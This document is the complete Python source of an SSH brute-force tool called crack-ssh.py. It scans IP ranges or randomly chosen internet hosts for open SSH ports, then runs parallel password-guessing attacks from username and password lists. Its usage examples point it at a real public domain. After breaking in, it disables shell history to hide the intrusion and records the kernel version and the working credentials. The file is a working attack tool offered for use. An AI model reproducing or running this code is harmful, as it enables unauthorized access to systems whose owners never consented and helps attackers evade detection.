#!/usr/bin/env python

from socket import *
import multiprocessing
import threading
import time
import paramiko
import sys
import os
import logging
import argparse
import random
import re


# version of crack-ssh.py
VERSION = 'v0.1'


# print version
def version():
    print '[+] crack-ssh.py %s' % (VERSION)
    sys.exit(0)

# check if we can write to file
def test_file(filename):
    try:
        outfile = open(filename, 'a')
        outfile.close()
    except IOError:
        print '[!] ERROR: cannot write to file \'%s\'' % filename
        sys.exit(1)

# define command line parameters and help page
def argspage():
    parser = argparse.ArgumentParser(
    usage = '\n\n   ./%(prog)s -i <arg> | -r <arg> | -I <arg>',
    formatter_class = argparse.RawDescriptionHelpFormatter,
    epilog =
    'examples:\n\n'

    '  attack single target\n'
    '  usage: ./%(prog)s -i baidu.com -L passwords.txt\n\n'

    '  scanning and attacking an ip-range\n'
    '  usage: ./%(prog)s -i 192.168.0-10.1-254 -u admin -l troll -s 500',
    add_help = False
    )

    options = parser.add_argument_group('options', '')
    options.add_argument('-i', default=False, metavar='<ip/range>',
            help='ip address/ip range/domain (e.g.: 192.168.0-3.1-254)')
    options.add_argument('-I', default=False, metavar='<file>',
            help='list of targets')
    options.add_argument('-r', default=False, metavar='<num>',
            help='attack random hosts')
    options.add_argument('-p', default=22, metavar='<num>',
            help='port number of sshd (default: 22)')
    options.add_argument('-t', default=4, metavar='<num>',
            help='threads per host (default: 4)')
    options.add_argument('-f', default=8, metavar='<num>',
            help='attack max hosts parallel (default: 8)')
    options.add_argument('-u', default='root', metavar='<username>',
            help='single username (default: root)')
    options.add_argument('-U', default=False, metavar='<file>',
            help='list of usernames')
    options.add_argument('-l', default='toor', metavar='<password>',
            help='single password (default: toor)')
    options.add_argument('-L', default=False, metavar='<file>',
            help='list of passwords')
    options.add_argument('-o', default=False, metavar='<file>',
            help='write found logins to file')
    options.add_argument('-O', default=False, metavar='<file>',
            help='write found target ip addresses to file')
    options.add_argument('-s', default=200, metavar='<num>',
            help='threads when port scanning (default: 200)')
    options.add_argument('-T', default=3, metavar='<sec>',
            help='timeout in seconds (default: 3)')
    options.add_argument('-V', action='store_true',
            help='print version of crack-ssh.py and exit')

    args = parser.parse_args()

    if args.V:
        version()

    if (args.i == False) and (args.I == False) and (args.r == False):
        print ''
        parser.print_help()
        sys.exit(0)

    return args

# write found ip addresses / logins to file
def write_to_file(filename, text):
    outfile = open(filename, 'a')
    outfile.write(text)
    outfile.close()

# connect to target and checks for an open port
def scan(target, port, timeout, oips):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.settimeout(timeout)
    result = sock.connect_ex((target, port))
    sock.close()
    if result == 0:
        HOSTLIST.append(target)
        if oips:
            write_to_file(oips, target + '\n')

# control the maximum number of threads
def active_threads(threads, waittime):
    while threading.activeCount() > threads:
        time.sleep(waittime)

# create thread and call scan()
def thread_scan(args, target):
    port = int(args.p)
    timeout = float(args.T)
    oips = args.O
    threads = int(args.s)

    bam = threading.Thread(target=scan, args=(target, port, timeout, oips))
    bam.start()

    active_threads(threads, 0.0001)
    time.sleep(0.001)

# only the output when scanning for targets
def scan_output(i):
    sys.stdout.flush()
    sys.stdout.write('\r[*] hosts scanned: {0} | ' \
            'possible to attack: {1}'.format(i, len(HOSTLIST)))

# handle format of given target(s)
def check_targets(targets):
    if re.match(r'^[0-9.\-]*$', targets):
        return targets
    try:
        target = gethostbyname(targets)
        return target
    except gaierror:
        print '[-] \'%s\' is unreachable' % (targets)
        finished()
        sys.exit(1)

# unsort found hosts, because of incremental scanning
def unsort_hostlist():
    print '[*] unsort host list'
    for i in range(15):
        random.shuffle(HOSTLIST)

# handle ip range format from command line
def handle_ip_range(iprange):
    parted = tuple(part for part in iprange.split('.'))

    rsa = range(4)
    rsb = range(4)
    for i in range(4):
        hyphen = parted[i].find('-')
        if hyphen != -1:
            rsa[i] = int(parted[i][:hyphen])
            rsb[i] = int(parted[i][1+hyphen:]) + 1
        else:
            rsa[i] = int(parted[i])
            rsb[i] = int(parted[i]) + 1

    return (rsa, rsb)

# call thread_scan() with target ip addresses
def ip_range(args):
    targets = check_targets(args.i)
    rsa, rsb = handle_ip_range(targets)

    print '[*] scanning %s for ssh services' % targets
    counter = 0
    for i in range(rsa[0], rsb[0]):
        for j in range(rsa[1], rsb[1]):
            for k in range(rsa[2], rsb[2]):
                for l in range(rsa[3], rsb[3]):
                    target = '%d.%d.%d.%d' % (i, j, k, l)
                    counter += 1
                    scan_output(counter)
                    thread_scan(args, target)

    # waiting for the last running threads
    active_threads(1, 0.1)

    scan_output(counter)
    print '\n[*] finished scan'

# create ip addresses
def randip():
    rand = range(4)
    for i in range(4):
        rand[i] = random.randrange(0, 256)

    # exclude 127.x.x.x
    if rand[0] == 127:
        randip()

    ipadd = '%d.%d.%d.%d' % (rand[0], rand[1], rand[2], rand[3])
    return ipadd

# create random ip addresses
def rand_ip(args):
    i = 0
    print '[*] scanning random ips for ssh services'
    while len(HOSTLIST) < int(args.r):
        i += 1
        scan_output(i)
        thread_scan(args, randip())

    # waiting for the last running threads
    active_threads(1, 1)

    scan_output(i)
    print '\n[*] finished scan.'

# checks if given filename by parameter exists
def file_exists(filename):
    try:
        open(filename).readlines()
    except IOError:
        print '[!] ERROR: cannot open file \'%s\'' % filename
        sys.exit(1)

# read-in a file with ip addresses
def ip_list(ipfile):
    file_exists(ipfile)
    targets = open(ipfile).readlines()
    for target in targets:
        HOSTLIST.append(target)

# connect to target and try to login
def crack(target, port, user, passwd, outfile, timeo, i):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    user = user.replace('\n', '')
    passwd = passwd.replace('\n', '')
    try:
        ssh.connect(target, port=port, username=user, password=passwd,
                timeout=timeo, pkey=None, allow_agent=False)
        time.sleep(3)
        try:
            ssh.exec_command('unset HISTFILE ; unset HISTSIZE')
            time.sleep(1)
            ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('uname -a ' \
                    '|| cat /proc/version')
            output = 'kernel: %s' \
                    % (ssh_stdout.readlines()[0].replace('\n', ''))
        except:
            output = 'info: maybe a honeypot or false positive'
        login = '[+] login found for %s | %s:%s\n' \
                '[!] %s' % (target, user, passwd, output)
        print login
        if outfile:
            write_to_file(outfile, login + '\n')
        ssh.close()
        os._exit(0)
    except paramiko.AuthenticationException, e:
        ssh.close()
        exception = str(e)
        if '[\'publickey\']' in exception:
            print '[-] key authentication only - ' \
                'stopped attack against %s' % (target)
            os._exit(1)
        elif '\'keyboard-interactive\'' in exception:
            print '[-] %s requires \'keyboard-interactive\' handler' % (target)
            os._exit(1)
    except:
        ssh.close()
        # after 3 timeouts per request the attack against $target will stopped
        if i < 3:
            i += 1
            # reconnect after random seconds (between 0.6 and 1.2 sec)
            randtime = random.uniform(0.6, 1.2)
            time.sleep(randtime)
            crack(target, port, user, passwd, outfile, timeo, i)
        else:
            print '[-] too many timeouts - stopped attack against %s' % (target)
            os._exit(1)

# create 'x' number of threads and call crack()
def thread_it(target, args):
    port = int(args.p)
    user = args.u
    userlist = args.U
    password = args.l
    passlist = args.L
    outfile = args.o
    timeout = float(args.T)
    threads = int(args.t)

    if userlist:
        users = open(userlist).readlines()
    else:
        users = [user]
    if passlist:
        passwords = open(passlist).readlines()
    else:
        passwords = [password]

    # try/except looks dirty but we need it :/
    try:
        for user in users:
            for password in passwords:
                Run = threading.Thread(target=crack, args=(target, port, user,
                    password, outfile, timeout, 0,))
                Run.start()
                # checks that we a max number of threads
                active_threads(threads, 0.01)
                time.sleep(0.1)
        # waiting for the last running threads
        active_threads(1, 1)
    except KeyboardInterrupt:
        os._exit(1)

# create 'x' child processes (child == cracking routine for only one target)
def fork_it(args):
    threads = int(args.t)
    childs = int(args.f)
    len_hosts = len(HOSTLIST)

    print '[*] attacking %d target(s)\n' \
            '[*] cracking up to %d hosts parallel\n' \
            '[*] threads per host: %d' % (len_hosts, childs, threads)

    i = 1
    for host in HOSTLIST:
        host = host.replace('\n', '')
        print '[*] performing attacks against %s [%d/%d]' % (host, i, len_hosts)
        hostfork = multiprocessing.Process(target=thread_it, args=(host, args))
        hostfork.start()
        # checks that we have a max number of childs
        while len(multiprocessing.active_children()) >= childs:
            time.sleep(0.001)
        time.sleep(0.001)
        i += 1

    # waiting for child processes
    while multiprocessing.active_children():
        time.sleep(1)

# \(0.o)/
def empty_hostlist():
    if len(HOSTLIST) == 0:
        print '[-] found no targets to attack!'
        finished()
        sys.exit(1)

# output when crack-ssh.py finished all routines
def finished():
    print '[*] game over!!!'

def main():
    args = argspage()

    if args.U:
        file_exists(args.U)
    if args.L:
        file_exists(args.L)
    if args.o:
        test_file(args.o)
    if args.O:
        test_file(args.O)

    if args.i:
        ip_range(args)
        unsort_hostlist()
    elif args.I:
        ip_list(args.I)
    else:
        rand_ip(args)

    time.sleep(0.1)
    empty_hostlist()
    fork_it(args)
    finished()

if __name__ == '__main__':
    HOSTLIST = []
    try:
        logging.disable(logging.CRITICAL)
        main()
    except KeyboardInterrupt:
        print '\nbye bye!!!'
        time.sleep(0.2)
        os._exit(1)
